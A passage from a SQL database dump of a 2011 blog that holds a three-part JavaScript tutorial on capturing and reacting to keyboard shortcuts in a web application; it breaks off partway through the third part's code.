parameter to help us determine which key was pressed. &nbsp;\\"keyman\\" is a JavaScript object literal that is defined below:</p>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n\r\n    add: function(e) {\r\n\r\n    },\r\n    \r\n    remove: function(e) {\r\n\r\n    }\r\n};\r\n</pre>\r\n<h2>The keyman.add(event) function</h2>\r\n<p>In this function, we want to figure out what key is currently being pressed by the user and store both the key\\''s code and its value in an array. &nbsp;To do this, we\\''re going to add two functions to the keyman object:</p>\r\n<pre class=\\"prettyprint\\">getCode: function(e) { \r\n    e = window.event || e; \r\n    var code = e.keyCode || e.which; \r\n    return code; \r\n}, \r\n\r\ngetKey: function(e) { \r\n    e = window.event || e; \r\n    var code = e.keyCode || e.which; \r\n    return String.fromCharCode(code); \r\n}\r\n</pre>\r\n<p>The getCode() function returns the actual character code from the event. &nbsp;The getKey() function returns the actual key\\''s value from the event. &nbsp;For example, if a user pressed the \\"a\\" key, the getCode function would return 65 and the getKey function would return \\"a\\". &nbsp;We need both the code and value of the key because some keys may not have a descriptive value that we can use (like the Escape key).</p>\r\n<p>Next, let\\''s add some code to the keyman.add(event) function to store the key code and value when the user fully presses a key:</p>\r\n<pre class=\\"prettyprint\\">add: function(e) {\r\n    var code = this.getCode(e);//key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n    var key = this.getKey(e).toUpperCase(); //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n\r\n    //if the key code and value aren\\''t already in the arrays, then add them!\r\n    if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n        this.code_registry.push(code);\r\n        this.key_registry.push(key);\r\n    }\r\n\r\n    return this;\r\n};\r\n</pre>\r\n<p>The code above simply adds the key code and value of the button being pressed to the code_registry and key_registry arrays respectively. &nbsp;Notice the inArray function that is called twice in the above code. &nbsp;Not all browsers implement this function so you\\''ll need to implement it yourself, here\\''s the code:</p>\r\n<pre class=\\"prettyprint\\">Array.prototype.inArray = function (value) {\r\n    var i;\r\n    for (i=0; i &lt; this.length; i++) {\r\n        if (this[i] === value) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return false;\r\n};\r\n</pre>\r\n<p>The inArray() function returns true if the value is found within the array, false otherwise. &nbsp;Let\\''s move on to the keyman.remove(event) function now.</p>\r\n<h2>The keyman.remove(event) function</h2>\r\n<p>In this function, we simply want to remove the key code and value of the key that was just released from the code_registry and key_registry arrays respectively. &nbsp;You might be asking yourself, why would we need to store the key\\''s code and value and then remove them so quickly once the key is released? The purpose is to capture combinations of key presses. &nbsp;For example, when I press the \\"CTRL\\" key, the keyman.add(event) function is immediately called and stores the key\\''s code and value. While I am holding down the \\"CTRL\\" key, I may press the \\"Z\\" key and again the keyman.add(event) function is called and stores the key\\''s code and value in the registries. &nbsp;Now that the keyman object \\"knows\\" that the \\"CTRL\\" and \\"Z\\" keys have both been pressed we can act on it and make something happen (like undoing whatever was just done). Making things happen once a certain combination of keys are pressed is what the next article in this series will cover. &nbsp;But for now, here\\''s the code for the keyman.remove(event) function:</p>\r\n<pre class=\\"prettyprint\\">remove: function(e) {\r\n    var code = this.getCode(e);\r\n    var key = this.getKey(e).toUpperCase();\r\n    \r\n    var index1 = this.code_registry.indexOf(code);\r\n    this.code_registry.splice(index1, 1);\r\n    \r\n    var index2 = this.key_registry.indexOf(key);\r\n    this.key_registry.splice(index2, 1);\r\n    \r\n    return this;\r\n}\r\n</pre>\r\n<p>Notice the indexOf() function that is called twice in the above code. &nbsp;Like the inArray() function, this function is also not implemented in all browsers so you will need to implement it yourself. &nbsp;I\\''m a nice guy though so I\\''ve provided the common code below:</p>\r\n<pre class=\\"prettyprint\\">if (!Array.prototype.indexOf)\r\n{\r\n  Array.prototype.indexOf = function(elt)\r\n  {\r\n    var len = this.length;\r\n\r\n    for (from = 0; from &lt; len; from++)\r\n    {\r\n    	if (from in this &amp;&amp; this[from] === elt) {\r\n    		return from;\r\n        }\r\n    }\r\n    return -1;\r\n  };\r\n};\r\n</pre>\r\n<p>This function returns the index of the element in the array or -1 if the element is not found. &nbsp;</p>\r\n<h2>The Keyman Object</h2>\r\n<p>So far, we\\''ve told the browser we want to record when the user fully presses a key and when the user releases a key. &nbsp;The complete code for this looks like the following:</p>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n\r\n    add: function(e) {\r\n        var code = this.getCode(e);//key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n        var key = this.getKey(e).toUpperCase(); //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n\r\n        //if the key code and value aren\\''t already in the arrays, then add them!\r\n        if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n            this.code_registry.push(code);\r\n            this.key_registry.push(key);\r\n        }\r\n\r\n        return this;\r\n    },\r\n\r\n    getCode: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return code; \r\n    }, \r\n\r\n    getKey: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return String.fromCharCode(code); \r\n    },\r\n\r\n    remove: function(e) {\r\n        var code = this.getCode(e);\r\n        var key = this.getKey(e).toUpperCase();\r\n    \r\n        var index1 = this.code_registry.indexOf(code);\r\n        this.code_registry.splice(index1, 1);\r\n    \r\n        var index2 = this.key_registry.indexOf(key);\r\n        this.key_registry.splice(index2, 1);\r\n    \r\n        return this;\r\n    }\r\n};</pre>\r\n<p>Check out the <a class=\\"link\\" href=\\"../demos/Keyman.html\\">Demonstration of How to Capture Keyboard Shortcuts with JavaScript</a>.</p>\r\n<h2>Part 2 - Reacting to Keyboard Shortcut Events</h2>\r\n<p>Part 2 of this series will go over how to create definitions for keyboard shortcuts so that when one of the definitions is called, we can act on it. The next article contains all the magic, just click on <a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shortcuts-in-Your-Web-Application---Part-2\\">Reacting to Keyboard Shortcut Events</a>.</p>\r\n<h2>Comments? Questions?</h2>\r\n<p>If you have any comments or questions, please leave a comment below, thanks for reading!</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\n$(document).ready(function() {\r\n    prettyPrint();\r\n});\r\n// ]]></script>', '2011-05-16 09:40:18', '2011-05-23 16:30:00');
INSERT INTO `js_blog` (`id`, `title`, `description`, `content`, `created`, `modified`) VALUES
(74, 'How To Implement Keyboard Shortcuts in Your Web Application - Part 2', 'How to implement and react to keyboard shortcuts in your web application', '<p>This is the second part of a three part series on how to implement keyboard shortcuts in a web application. In this part, we\\''ll go over how to create definitions for keyboard shortcuts so that when one of the definitions is called (i.e. when a user presses CTRL + Z) then we can act on it. &nbsp;If you haven\\''t read the first part of this series yet, just click below:</p>\r\n<ol>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shortcuts-In-Your-Web-Application---Part-1\\">How to Capture Keyboard Shortcuts with JavaScript</a></li>\r\n<li>Reacting to Keyboard Shortcut Events</li>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shorcuts-in-Your-Web-Application---Part-3\\">How To Use Keyboard Shortcuts For Good and not Evil</a></li>\r\n</ol>\r\n<h2>Our JavaScript Object Literal Currently Looks Like This</h2>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n\r\n    add: function(e) {\r\n        //key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n        var code = this.getCode(e); \r\n\r\n        //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n        var key = this.getKey(e).toUpperCase(); \r\n\r\n        //if the key code and value aren\\''t already in the arrays, then add them!\r\n        if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n            this.code_registry.push(code);\r\n            this.key_registry.push(key);\r\n        }\r\n\r\n        return this;\r\n    },\r\n\r\n    getCode: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return code; \r\n    }, \r\n\r\n    getKey: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return String.fromCharCode(code); \r\n    },\r\n\r\n    remove: function(e) {\r\n        var code = this.getCode(e);\r\n        var key = this.getKey(e).toUpperCase();\r\n    \r\n        var index1 = this.code_registry.indexOf(code);\r\n        this.code_registry.splice(index1, 1);\r\n    \r\n        var index2 = this.key_registry.indexOf(key);\r\n        this.key_registry.splice(index2, 1);\r\n    \r\n        return this;\r\n    }\r\n};\r\n</pre>\r\n<p>You can see a demo of the class as it is above here: <a href=\\"../demos/Keyman.html\\">Demonstration of How To Capture Keyboard Shortcuts</a>.</p>\r\n<h2>Reacting To Keyboard Shortcut Events | Demo: <a class=\\"link\\" href=\\"../demos/Keyman2.html\\">Click Here</a></h2>\r\n<p>Currently, we\\''re capturing and logging when a user presses a key on the keyboard, but there aren\\''t any events that happen, or called, after a user presses the correct combination of keys. &nbsp;We need a way to tell our application what combination of keys we are looking for and what should happen once the user presses the right keys (in order). &nbsp;Let\\''s begin by adding a register() function that helps us define our keyboard shortcut:</p>\r\n<pre class=\\"prettyprint\\">registry: [], //an array that holds all of our registry entries\r\n\r\n/**\r\n* register - registers a combination of key presses that produce a keyboard shortcut\r\n*    @param id - a unique identifier that describes the shortcut\r\n*    @param key - a set of keys (i.e. a, b, c, etc); for multiple combos \r\n*          separate keys with the + sign (i.e. j+k+l); can optionally use key code too (i.e. 65 for \\''a\\'', etc)\r\n*    @param keydown - a function that executes when this shortcut has all the keys pressed down\r\n*    @param mods - a comma separated list of modifiers (CTRL, SHIFT, and/or ALT | i.e. CTRL,ALT)\r\n*/\r\nregister: function(id, key, keydown, mods) {\r\n    mods = (mods) ? mods.split(\\'',\\'') : null;\r\n    this.registry.push([id, key.toUpperCase(), keydown, mods]);\r\n    return this;\r\n}\r\n</pre>\r\n<p>This method takes 4 parameters with the first two parameters being the most important. &nbsp;The \\"id\\" parameter is necessary in case we need to remove (unregister) the shortcut for any reason. &nbsp;The \\"key\\" parameter is obviously needed so that we can compare the keys the user presses to the ones we define - once we make a match, the events can be called. Note here that you can optionally use a key code (instead of key value) for the \\"key\\" parameter.</p>\r\n<p>Here\\''s a couple examples of how to call the register function (this code can be placed anywhere in the document as long as the keyman object is defined above (or before) the code is executed):</p>\r\n<pre class=\\"prettyprint\\">//SHIFT + S\r\nkeyman.register(\\''SaveSomething\\'', \\''s\\'', function(event) {\r\n    //do something when all keys are pressed down\r\n    alert(\\''all keys are pressed down!\\'');\r\n}, \\''SHIFT\\'');\r\n\r\n//Escape key (no modifiers here)\r\nkeyman.register(\\''CloseSomething\\'', \\''27\\'', function(event) {\r\n    alert(\\"I\\''m closing something here with the Escape key! Maybe a popup window! Who knows!\\");\r\n});\r\n</pre>\r\n<p>In the first example, as soon as I press and hold down the SHIFT key and then the \\"S\\" key, an alert message displays saying \\"all keys are pressed down!\\".</p>\r\n<p>In the second example, as soon as I press the escape key, I get an alert that says \\"I\\''m closing something here with the Escape key! Maybe a popup window! Who knows!\\". &nbsp;Of course, you don\\''t have to make your functions say this, that would be lame, instead make them do something useful!&nbsp;</p>\r\n<p>The problem with both examples is that there is nothing in our keyman class that calls the keydown function in our definitions once the right set of keys are pressed! To do this, we need to modify the add function a bit and add a new function \\"press\\" that will check if the user has pressed the right combination and run any events.</p>\r\n<h2>The Modified keyman.add(event) Function</h2>\r\n<pre class=\\"prettyprint\\">add: function(e) {\r\n    //key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n    var code = this.getCode(e);\r\n\r\n    //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n    var key = this.getKey(e).toUpperCase(); \r\n\r\n    //if the key code and value aren\\''t already in the arrays, then add them!\r\n    if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n        this.code_registry.push(code);\r\n        this.key_registry.push(key);\r\n    }\r\n\r\n    this.press(e);\r\n\r\n    return this;\r\n},\r\n</pre>\r\n<p>When I said we\\''d be modifying this a little bit, I really meant it! All we added was a call to the press(event) that we\\''ll be calling shortly. It\\''s important to know that once a user presses a key on their keyboard, the add function runs and the press function is called right after.</p>\r\n<h2>The keyman.press(event) Function</h2>\r\n<p>This function is where the real work comes in. &nbsp;It cycles through our definitions and determines if all the keys in the definition have been pressed by checking the key and code registries (arrays). If all the keys have been pressed (including the right modifiers, if any were specified), then the keydown function is called.</p>\r\n<pre class=\\"prettyprint\\">press: function(e) {			\r\n    //check if any modifiers are currently pressed\r\n    var mods = [];\r\n	\r\n    if(e.shiftKey == 1) mods.push(\\''SHIFT\\'');\r\n    if(e.ctrlKey == 1) mods.push(\\''CTRL\\'');\r\n    if(e.altKey == 1) mods.push(\\''ALT\\'');\r\n\r\n    //loop through registry to find a match for the current key presses\r\n    for(i = 0; i &lt; this.registry.length; i++) {\r\n	var r_id = this.registry[i][0];\r\n	var r_key = this.registry[i][1];\r\n	var r_keydown = this.registry[i][2];\r\n	var r_mods = this.registry[i][3];\r\n	\r\n	var all_pressed = true;\r\n	var keys = []; //keys in this definition, helpful for removal later\r\n	\r\n	if(r_key.indexOf(\\''+\\'') != -1) {\r\n	    keys = r_key.split(\\''+\\'');\r\n		\r\n	    for(j = 0; j &lt; keys.length; j++) {\r\n	    	if(!this.key_registry.inArray(keys[j]) &amp;&amp; !this.code_registry.inArray(parseInt(keys[j]))) {\r\n	            all_pressed = false;\r\n	    	}\r\n	    }\r\n	} else if(!this.key_registry.inArray(r_key) &amp;&amp; !this.code_registry.inArray(parseInt(r_key))) {\r\n	    all_pressed = false;\r\n	} else {\r\n	    keys.push(r_key);\r\n	}\r\n\r\n	if(all_pressed) {\r\n	    //check modifiers if they were defined and are pressed\r\n	    var mods_pressed = true;\r\n\r\n	    if(r_mods &amp;&amp; r_mods.length &gt; 0) {\r\n		for(j = 0; j &lt; r_mods.length; j++) {\r\n	            var mod = r_mods[j];\r\n\r\n	            if(!mods.inArray(mod)) {\r\n			mods_pressed = false;\r\n		    }\r\n		}\r\n	    }\r\n\r\n	    if(mods_pressed) {\r\n                if(typeof r_keydown == \\''function\\'') {\r\n		    r_keydown(e);\r\n	        }\r\n\r\n		//remove all the pressed keys from the registry\r\n	        for(j = 0; j &lt; keys.length; j++) {\r\n		    var index = this.key_registry.indexOf(keys[j]);\r\n		    this.key_registry.splice(index, 1); //remove key from registry\r\n		    this.code_registry.splice(index, 1); //remove code from registry\r\n		}\r\n	    }\r\n	}\r\n    }\r\n\r\n    return this;\r\n}\r\n</pre>\r\n<p>This is a pretty heavy function, and may be a little confusing so let\\''s go through it:</p>\r\n<p>1. The first thing we do is check if any modifiers are currently being pressed by using the passed in window.event object.</p>\r\n<p>2. Next, we loop through the registry and compare our shortcut definitions to the keys that are currently being pressed down.</p>\r\n<p>3. Inside the for loop you will see that if the key parameter (r_key) contains a + sign, we create an array and check each of the keys to see if they are contained inside either the key or code registries. &nbsp;If they aren\\''t, the \\"all_pressed\\" boolean variable becomes false. &nbsp;If there wasn\\''t a + sign in the key parameter (r_key), we simply check to see if r_key is in either the key or code registries; again, if not, the \\"all_pressed\\" boolean variable becomes false.&nbsp;</p>\r\n<p>4. If all the keys have been pressed, we check to see if all the modifiers (contained in the definition) have been pressed as well. &nbsp;If everything matches up, we can then call the keydown (r_keydown) function to run some code that we want to happen when a user presses the right combination of keys in our definition.</p>\r\n<h2><span class=\\"Apple-style-span\\" style=\\"font-size: 15px; font-weight: bold;\\">Here\\''s Our Updated Keyman Object</span></h2>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n    registry: [], //an array that holds all of our registry entries\r\n\r\n    add: function(e) {\r\n        //key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n        var code = this.getCode(e); \r\n\r\n        //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n        var key = this.getKey(e).toUpperCase(); \r\n\r\n        //if the key code and value aren\\''t already in the arrays, then add them!\r\n        if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n            this.code_registry.push(code);\r\n            this.key_registry.push(key);\r\n        }\r\n\r\n        this.press(e);\r\n\r\n        return this;\r\n    },\r\n\r\n    getCode: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return code; \r\n    }, \r\n\r\n    getKey: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return String.fromCharCode(code); \r\n    },\r\n\r\n    press: function(e) {\r\n        //check if any modifiers are currently pressed\r\n        var mods = [];\r\n        \r\n        if(e.shiftKey == 1) mods.push(\\''SHIFT\\'');\r\n        if(e.ctrlKey == 1) mods.push(\\''CTRL\\'');\r\n        if(e.altKey == 1) mods.push(\\''ALT\\'');\r\n\r\n        //loop through registry to find a match for the current key presses\r\n        for(i = 0; i &lt; this.registry.length; i++) {\r\n            var r_id = this.registry[i][0];\r\n            var r_key = this.registry[i][1];\r\n            var r_keydown = this.registry[i][2];\r\n            var r_mods = this.registry[i][3];\r\n\r\n            var all_pressed = true;\r\n            var keys = []; //keys in this definition, helpful for removal later\r\n    \r\n            if(r_key.indexOf(\\''+\\'') != -1) {\r\n                keys = r_key.split(\\''+\\'');\r\n            \r\n                for(j = 0; j &lt; keys.length; j++) {\r\n                    if(!this.key_registry.inArray(keys[j]) &amp;&amp; !this.code_registry.inArray(parseInt(keys[j]))) {\r\n                       all_pressed = false;\r\n                    }\r\n                }\r\n            } else if(!this.key_registry.inArray(r_key) &amp;&amp; !this.code_registry.inArray(parseInt(r_key))) {\r\n                all_pressed = false;\r\n            } else {\r\n                keys.push(r_key);\r\n            }\r\n\r\n            if(all_pressed) {\r\n                //check modifiers if they were defined and are pressed\r\n                var mods_pressed = true;\r\n\r\n                if(r_mods &amp;&amp; r_mods.length &gt; 0) {\r\n                    for(j = 0; j &lt; r_mods.length; j++) {\r\n                        var mod = r_mods[j];\r\n\r\n                        if(!mods.inArray(mod)) {\r\n                            mods_pressed = false;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                if(mods_pressed) {\r\n                    if(typeof r_keydown == \\''function\\'') {\r\n                        r_keydown(e);\r\n                    }\r\n\r\n                    //remove all the pressed keys from the registry\r\n                    for(j = 0; j &lt; keys.length; j++) {\r\n                        var index = this.key_registry.indexOf(keys[j]);\r\n                        this.key_registry.splice(index, 1); //remove key from registry\r\n                        this.code_registry.splice(index, 1); //remove code from registry\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return this;\r\n    },\r\n\r\n    /**\r\n    * register - registers a combination of key presses that produce a keyboard shortcut\r\n    *    @param id - a unique identifier that describes the shortcut\r\n    *    @param key - a set of keys (i.e. a, b, c, etc); for multiple combos \r\n    *          separate keys with the + sign (i.e. j+k+l); can optionally use key code too \r\n    *          (i.e.  65 for \\''a\\'', etc)\r\n    *    @param keydown - a function that executes when this shortcut has all the keys \r\n    *          pressed down\r\n    *    @param mods - a comma separated list of modifiers (CTRL, SHIFT, and/or ALT | \r\n    *          i.e. CTRL,ALT)\r\n    */\r\n    register: function(id, key, keydown, mods) {\r\n        mods = (mods) ? mods.split(\\'',\\'') : null;\r\n        this.registry.push([id, key.toUpperCase(), keydown, mods]);\r\n        return this;\r\n    },\r\n\r\n    remove: function(e) {\r\n        var code = this.getCode(e);\r\n        var key = this.getKey(e).toUpperCase();\r\n    \r\n        var index1 = this.code_registry.indexOf(code);\r\n        this.code_registry.splice(index1, 1);\r\n    \r\n        var index2 = this.key_registry.indexOf(key);\r\n        this.key_registry.splice(index2, 1);\r\n    \r\n        return this;\r\n    }\r\n};\r\n</pre>\r\n<p>To view a demonstration of this class click on <a class=\\"link\\" href=\\"../demos/Keyman2.html\\">Reacting To Keyboard Shortcut Events</a>.</p>\r\n<h2>Part 3 Coming Soon</h2>\r\n<p>We\\''ve still got some more work to do! &nbsp;We need to be able to prevent keyboard shortcuts from activating if a user is typing something into a textfield on a form. &nbsp;So without further ado, let\\''s move on to <a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shorcuts-in-Your-Web-Application---Part-3\\">How To Use Keyboard Shortcuts for Good and not Evil</a>!</p>\r\n<h2>Comments? Questions?</h2>\r\n<p>If you have any comments or questions, please leave a comment below, thanks for reading!</p>\r\n<p>&nbsp;</p>\r\n<script type=\\"text/javascript\\">// <![CDATA[\r\n$(document).ready(function() {\r\n    prettyPrint();\r\n});\r\n// ]]></script>', '2011-05-18 10:14:40', '2011-05-23 16:30:46'),
(76, 'How To Implement Keyboard Shortcuts in Your Web Application - Part 3', 'Common problems for using keyboard shortcuts and how to use them for good and not evil', '<p>This is the last part of a three part series on how to implement keyboard shortcuts in a web application. In this part, we\\''ll update our keyman object and prevent any keyboard shortcuts from activating if a user is typing into a textfield on a form. We\\''ll also go over a couple problems you might run into when using keyboard shortcuts. If you missed the first or second part of this series, you can click either of the below links to get to them and get caught up!</p>\r\n<ol>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shortcuts-In-Your-Web-Application---Part-1\\">How to Capture Keyboard Shortcuts with JavaScript</a></li>\r\n<li><a class=\\"link\\" href=\\"../Blog/How-To-Implement-Keyboard-Shortcuts-In-Your-Web-Application---Part-2\\">Reacting to Keyboard Shortcut Events</a></li>\r\n<li>How To Use Keyboard Shortcuts For Good and not Evil</li>\r\n</ol>\r\n<h2>This Is What Our Keyman Object Looks Like So Far</h2>\r\n<pre class=\\"prettyprint\\">var keyman = {\r\n    code_registry: [],\r\n    key_registry: [],\r\n    registry: [], //an array that holds all of our registry entries\r\n\r\n    add: function(e) {\r\n        //key code (i.e. if \\"a\\" is pressed, then this function returns \\"65\\")\r\n        var code = this.getCode(e); \r\n\r\n        //key value (i.e. if \\"a\\" is pressed, then this function returns \\"A\\")\r\n        var key = this.getKey(e).toUpperCase(); \r\n\r\n        //if the key code and value aren\\''t already in the arrays, then add them!\r\n        if(!this.code_registry.inArray(code) &amp;&amp; !this.key_registry.inArray(key)) {\r\n            this.code_registry.push(code);\r\n            this.key_registry.push(key);\r\n        }\r\n\r\n        this.press(e);\r\n\r\n        return this;\r\n    },\r\n\r\n    getCode: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return code; \r\n    }, \r\n\r\n    getKey: function(e) { \r\n        e = window.event || e; \r\n        var code = e.keyCode || e.which; \r\n        return String.fromCharCode(code); \r\n    },\r\n\r\n    press: function(e) {\r\n        //check if any modifiers are currently pressed\r\n        var mods = [];\r\n        \r\n        if(e.shiftKey == 1) mods.push(\\''SHIFT\\'');\r\n        if(e.ctrlKey == 1) mods.push(\\''CTRL\\'');\r\n        if(e.altKey == 1) mods.push(\\''ALT\\'');\r\n\r\n        //loop through registry to find a match for the current key presses\r\n        for(i = 0; i &lt; this.registry.length; i++) {\r\n            var r_id = this.registry[i][0];\r\n            var r_key = this.registry[i][1];\r\n            var r_keydown = this.registry[i][2];\r\n            var r_mods = this.registry[i][3];\r\n\r\n            var all_pressed = true;\r\n            var keys = []; //keys in this definition, helpful for removal later\r\n    \r\n            if(r_key.indexOf(\\''+\\'') != -1) {\r\n                keys = r_key.split(\\''+\\'');\r\n            \r\n                for(j = 0; j &lt; keys.length; j++) {\r\n                    if(!this.key_registry.inArray(keys[j]) &amp;&amp; !this.code_registry.inArray(parseInt(keys[j]))) {\r\n                       all_pressed = false;\r\n                    }\r\n                }\r\n            } else if(!this.key_registry.inArray(r_key) &amp;&amp; !this.code_registry.inArray(parseInt(r_key))) {\r\n                all_pressed = false;\r\n            } else {\r\n                keys.push(r_key);\r\n            }\r\n\r\n            if(all_pressed) {\r\n                //check modifiers if they were defined and are pressed\r\n                var mods_pressed = true;\r\n\r\n                if(r_mods &amp;&amp; r_mods.length &gt; 0) {\r\n                    for(j = 0; j &lt; r_mods.length; j++) {\r\n                        var mod = r_mods[j];\r\n\r\n                        if(!mods.inArray(mod)) {\r\n                            mods_pressed = false;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                if(mods_pressed) {\r\n                    if(typeof r_keydown == \\''function\\'') {\r\n                        r_keydown(e);\r\n                    }\r\n\r\n                    //remove all the pressed keys from the registry\r\n                    for(j = 0; j &lt; keys.length; j++) {\r\n                        var index = this.key_registry.indexOf(keys[j]);\r\n                        this.key_registry.splice(index, 1); //remove key from registry\r\n                        this.code_registry.splice(index, 1); //remove code from registry\r\n                    }\r\n                }\r\n            }\r\n        }\r\n\r\n        return this;\r\n    },\r\n\r\n    /**\r\n    * register - registers a combination of key presses that produce a keyboard shortcut\r\n    *    @param id - a unique identifier that describes the shortcut\r\n    *    @param key - a set of keys (i.e. a, b, c, etc); for multiple combos \r\n    *          separate keys with the + sign (i.e. j+k+l); can optionally use key code too \r\n    *          (i.e.  65 for \\''a\\'', etc)\r\n    *    @param keydown - a function that executes when this shortcut has all the keys \r\n    *          pressed down\r\n    *    @param mods - a comma separated list of modifiers (CTRL, SHIFT, and/or ALT | \r\n    *          i.e. CTRL,ALT)\r\n    */\r\n    register: function(id, key, keydown, mods) {\r\n        mods = (mods) ? mods.split(\\'',\\'') : null;\r\n        this.registry.push([id, key.toUpperCase(), keydown, mods]);\r\n        return this;\r\n    },\r\n\r\n    remove: function(e) {\r\n        var code = this.getCode(e);\r\n        var key = this.getKey(e).toUpperCase();\r\n    \r\n        var index1 = this.code_registry.indexOf(code);\r\n        this.code_registry.splice(index1, 1);\r\n    \r\n        var index2 = this.key_registry.indexOf(key);\r\n        this.key_registry.splice(index2, 1);\r\n    \r\n        return this;\r\n    }\r\n};\r\n</pre>\r\n<p>To see a demonstration of how it works so far, check out <a class=\\"link\\" href=\\"demos/Keyman2.html\\">Demonstration on Reacting to Keyboard Shortcuts</a>.</p>\r\n<p>As you can see in the demonstration (right-click and view the source), three keyboard shortcuts were registered with each one reacting in a different way when the user presses the right combination of keys. The problem with our implementation thus far is it doesn\\''t prevent events from running when a user is typing into a textfield on a form. To do this, we need to modify the keyman.press(event) function to catch when the target of the passed in window.event object is a field on a form.</p>\r\n<h2>Modifying the keyman.press(event) Function</h2>\r\n<pre class=\\"prettyprint\\">getTarget: function(e) {\r\n    e = window.event || e;\r\n    var target = e.target || e.srcElement;\r\n    return target;\r\n},\r\n\r\npress: function(e) {\r\n    var target = this.getTarget(e);\r\n\r\n    //check if any modifiers are currently pressed\r\n    var mods = [];\r\n        \r\n    if(e.shiftKey == 1) mods.push(\\''SHIFT\\'');\r\n    if(e.ctrlKey == 1) mods.push(\\''CTRL\\'');\r\n    if(e.altKey == 1) mods.push(\\''ALT\\'');\r\n\r\n    var tags = [\\''INPUT\\'',\\''SELECT\\'',\\''TEXTAREA\\''];\r\n\r\n    if(tags.inArray(target.tagName)) {\r\n        return this;   \r\n    }\r\n\r\n    //loop through registry to find a match for the current key presses\r\n    for(i = 0; i &lt; this.registry.length; i++) {\r\n        var r_id = this.registry[i][0];\r\n        var r_key = this.registry[i][1];\r\n        var r_keydown = this.registry[i][2];\r\n        var r_mods = this.registry[i][3];\r\n\r\n        var all_pressed = true;\r\n        var keys = []; //keys in this definition, helpful for removal later\r\n\r\n        if(r_key.indexOf(\\''+\\'') != -1) {\r\n            keys = r_key.split(\\''+\\'');\r\n            \r\n            for(j = 0; j &lt; keys.length; j++) {\r\n                if(!this.key_registry.inArray(keys[j]) &amp;&amp; !this.code_registry.inArray(parseInt(keys[j]))) {\r\n                    all_pressed = false;\r\n                }\r\n            }\r\n        } else if(!this.key_registry.inArray(r_key) &amp;&amp; !this.code_registry.inArray(parseInt(r_key))) {\r\n            all_pressed = false;\r\n        } else {\r\n            keys.push(r_key);\r\n        }\r\n\r\n        if(all_pressed) {\r\n            //check modifiers if they were defined and are pressed\r\n            var mods_pressed = true;\r\n\r\n            if(r_mods &amp;&amp; r_mods.length &gt; 0) {\r\n                for(j = 0; j &lt; r_mods.length; j++) {\r\n                    var mod = r_mods[j];\r\n\r\n                    if(!mods.inArray(mod)) {\r\n                        mods_pressed = false;\r\n                    }\r\n                }\r\n            }\r\n\r\n            if(mods_pressed) {\r\n                if(typeof r_keydown == \\''function\\'') {\r\n                    r_keydown(e);\r\n                }\r\n\r\n                //remove all the pressed keys from the registry\r\n                for(j = 0; j &lt; keys.length; j++) {\r\n                    var index = this.key_registry.indexOf(keys[j]);\r\n                    this.key_registry.splice(index, 1); //remove key from registry\r\n                    this.code_registry.splice(index, 1); //remove code from registry\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    return this;\r\n}\r\n</pre>\r\n<p>First off, we added the getTarget(event) function. This function retrieves the element that serves as the target of the event that\\''s passed in. So when a user is typing into a textfield, for example, the target element will be the textfield. Next, the press(event) function was modified to check the target element\\''s tag name and match it against INPUT, SELECT, and TEXTAREA. If the tag name is any of those three then we don\\''t want to run any keyboard shortcut events; so we return from the function.</p>\r\n<h2>Handling Duplicate Registrations</h2>\r\n<p>So what would happen if we registered two keyboard shortcuts (lets say, SHIFT + S) that do two different things? Our Keyman object would simply execute both shortcut events! We likely don\\''t want that to happen and the best we can do is check to see if the keys we want to register have already been registered. Another option is to first unregister our set of keys. Let\\''s provide both options:</p>\r\n<pre class=\\"prettyprint\\">indexOf: function(id_or_key, modifiers) {\r\n    var index = -1;\r\n    \r\n    for(i = 0; i &lt; this.registry.length; i++) {\r\n        if(this.registry[i][0] == id_or_key || this.registry[i][1] == id_or_key) {\r\n            if(modifiers) {\r\n                if(this.registry[i][3].join(\\'',\\'') == modifiers) {\r\n                    index = i;\r\n                    break;\r\n                }\r\n            } else {\r\n                index = i;\r\n                break;\r\n            